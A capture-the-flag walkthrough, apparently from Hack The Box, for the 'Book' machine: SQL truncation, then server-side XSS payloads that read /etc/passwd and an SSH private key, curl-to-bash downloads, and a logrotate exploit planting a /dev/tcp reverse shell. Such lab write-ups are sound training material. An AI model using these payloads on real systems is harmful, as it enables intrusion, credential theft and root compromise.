@@ -1,0 +1,197 @@
+Book
+
+7th July 2020 / Document No D20.100.80
+Prepared By: MinatoTW
+Machine Author(s): MrR3boot
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Book is a medium difficulty Linux machine hosting a Library application. It allows users to sign up
+and add books, as well as provide feedback. The back-end database is found to be vulnerable to
+SQL truncation, which is leveraged to register an account as admin and escalate privileges. The
+admin panel contains additional functionality to export PDFs, which is exploited through XSS to
+gain SSH access. Finally, misconfigured logs are exploited to get root.
+
+Skills Required
+
+      Web Enumeration
+      JavaScript
+
+Skills Learned
+
+      SQL Truncation
+      XSS
+      Logrotate Exploitation
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.176 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.10.176
+
+Nmap reveals two open ports running HTTP and SSH respectively.
+
+Apache
+
+Browsing to port 80 returns a sign-up and login form.
+
+Clicking on Sign Up without any input results in the following pop-up.
+The page asks us to register usernames with less than 10 characters only. Similarly, an empty
+email field prompts us to enter an address of less than 20 characters in length.
+
+Gobuster
+
+Let's run Gobuster to find any hidden folders.
+
+The /docs folder returns a 403 forbidden error. However, the admin folder hosts an admin login
+form.
+Let's register a new account with admin to see if this username exists.
+The registration as admin was successful and we get access to the library.
+Let's see if we can use the same credentials on the admin page.
+
+We're denied access to the admin panel, which means that the login depends on the email and
+not username. Let's try using an email such as admin@book.htb .
+
+The page states that the user already exists. Let's return to the registered account and
+enumerate the application. The library application contains a few pages with different
+functionality.
+The Collections page contains a book submission upload form.
+Let's upload a file and see if we can find the upload location.
+
+The page displays the following pop-up and returns to the submission page.
+
+The file location isn't revealed and it's not found in the /docs folder either. Let's continue
+enumerating the application. The profile information page allows us to edit our username.
+Let's intercept the request in Burp for further inspection.
+
+SQL Truncation
+
+Sending a request with a username that is greater than 10 characters is found to result in
+truncation of the username.
+
+Let's see if this behavior exists even with spaces in the input.
+We enter multiple spaces then URL encode the entire username and forward the request.
+Refreshing the profile page shows that our username was set to admin with trailing spaces.
+
+According to the MySQL documentation, trailing spaces are ignored during database operations.
+This means that the usernames "admin " and "admin" are identical from a MySQL perspective.
+Assuming that the backend DBMS is MySQL, we should be able to leverage this attack to sign-up
+as admin@book.htb . Send another request from the sign up form and intercept it.
+
+We register the username someuser , and the email admin@book.htb with trailing spaces and
+characters. This should truncate our input and insert the email into the database as
+admin@book.htb . Forwarding the request doesn't return any errors and redirects us to the login
+page. Let's login with the credentials someuser / admin now.
+
+We're granted access to the admin panel now. The Collections tab seems to allow exporting of
+collections in PDF format.
+Adding a new collection and then exporting it results in the following PDF.
+
+We see our collection entry at the end of the table, which resembles a table created using HTML
+code. Possibly the table is rendered by the server before converting it to PDF?
+
+XSS
+
+Let's try adding a new collection with an img tag pointing to our IP address. If the server renders
+the HTML, then we should receive an HTTP request.
+
+   <img src="http://10.10.14.3/test" />
+
+Submit the book, start a listener on port 80 and then export the collection from the admin panel.
+As expected, we received an HTTP request on our listener with the User-Agent containing
+PhantomJS . PhantomJS is a server-side headless browser that is scriptable using JavaScript. It is
+useful for task automation, testing and taking screen captures of remote web pages.
+As the script runs server-side, we should be able to run JavaScript code during the rendering
+process. Let's use a simple JS snippet to test this.
+
+   <script>document.write("Javascript works!")</script>
+Enter the snippet above into the book submission and proceed to export the PDF.
+
+We see that the string Javascript works! was successfully written to the document. Now that
+we have achieved code execution, we can use the XMLHttpRequest class and attempt to read
+local files using the file:/// URI scheme.
+
+   <script>
+          var x = new XMLHttpRequest();
+          x.open("GET", "file:///etc/passwd", true);
+          x.onload = function(){
+                 document.write(x.responseText);
+          };
+          x.send();
+
+   </script>
+The script above will attempt to read the /etc/passwd file and write it out to the HTML page.
+/etc/passwd is a good choice as it is readable by all system users. Enter this into the submission
+page and then export the PDF.
+
+The export was successful and we are able to read the passwd file.
+Foothold
+
+A user named reader is found to exist with a valid shell.
+
+Let's check if we can read the SSH private key of this account.
+   <script>
+          var x = new XMLHttpRequest();
+          x.open("GET", "file:///home/reader/.ssh/id_rsa", true);
+          x.onload = function(){
+                 var code = "<textarea rows='100' cols='70'>" + btoa(x.responseText) + "
+   </textarea>";
+                 document.write(code);
+          };
+          x.send();
+   </script>
+
+Update the script with the default path to the SSH private key. The btoa() function is used to
+convert the key to base64 for easy copying and pasting. We can use a textarea element with a
+fixed set of columns in order to capture the entire output within the PDF itself.
+Sending the payload results in the key being returned.
+
+Copy the entire payload and then decode it.
+We can now SSH in as reader using this key.
+Privilege Escalation
+
+A script such as linPEAS can be used to run local enumeration checks. Download the script and
+execute it using cURL and bash.
+
+   curl 10.10.14.3:8000/linpeas.sh | bash
+
+The script tells us that we have access to writable log files which can be exploited. Looking at the
+URL provided we see the following:
+
+According to the post, logrotate can be exploited through a race condition if a user has write
+access to the log files. Logrotate is a utility that performs periodic removal, compression, and
+storage of log files. A user with write privileges to log files can symlink it to any sensitive file on
+the system and then write to it.
+A tool such as pspy can be used to confirm if logrotate is running or not.
+
+   wget 10.10.14.3:8000/pspy64s && chmod +x pspy64s
+Pspy shows that logrotate is being run by a user with uid 0 i.e. root.
+Now we know that logrotate is running, let's proceed to exploit it. The logrotten PoC can be used
+to exploit this.
+
+   git clone https://github.com/whotwagner/logrotten
+   gcc logrotten.c -o logrotten
+
+Use the commands above to clone the repository and compile the binary. Next, create a file
+named shell with the following contents:
+
+   #!/bin/bash
+   bash -c "/bin/bash -i >& /dev/tcp/10.10.14.3/4444 0>&1" &
+
+Transfer both of these files to the target.
+
+   wget 10.10.14.3:8000/logrotten
+   wget 10.10.14.3:8000/shell
+   chmod +x logrotten shell
+
+Next, we can add some contents to the log file in order to trigger rotation.
+
+   echo test >> /home/reader/backups/access.log
+   ./logrotten -d -p shell /home/reader/backups/access.log
+
+Our payload should be written to /etc/bash_completion.d/ once logrotate runs.
+The directory /etc/bash_completion.d/ contains bash scripts that run every time a user logs in,
+and so we should get a root shell when root logs in.
+
